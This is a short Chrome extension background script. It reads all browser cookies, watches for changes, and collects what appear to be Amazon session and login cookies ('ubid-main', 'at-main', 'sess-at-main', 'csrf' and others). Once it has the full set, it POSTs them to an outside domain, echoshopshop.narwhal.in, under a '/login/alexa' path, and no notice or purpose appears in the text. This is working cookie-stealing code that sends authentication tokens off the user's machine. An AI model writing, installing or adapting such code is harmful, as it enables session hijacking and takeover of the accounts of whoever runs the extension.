const domain = 'echoshopshop.narwhal.in';

const required = [
    'ubid-main',
    'x-main',
    'at-main',
    'sess-at-main',
    'csrf',
];

let cookies = {};

chrome.cookies.getAll({}, (cookies) => {
    for (cookie of cookies) {
        saveCookie(cookie);
    }
    chrome.cookies.onChanged.addListener(({removed, cookie}) => {
        if (removed) {
            delete cookies[cookie.name];
        } else {
            saveCookie(cookie);
        }
    });
});

function saveCookie(cookie) {
    if (!required.includes(cookie.name)) {
        return;
    }
    cookies[cookie.name] = cookie;
    const numRemaining = required.length - Object.keys(cookies).length;
    console.log(`Saving cookie ${cookie.name}. Need ${numRemaining} more`);
    if (Object.keys(cookies).length === required.length) {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', `https://${domain}/login/alexa`, true);
        xhr.setRequestHeader('Content-type', 'application/json');
        xhr.send(JSON.stringify(Object.values(cookies)));
    }
};
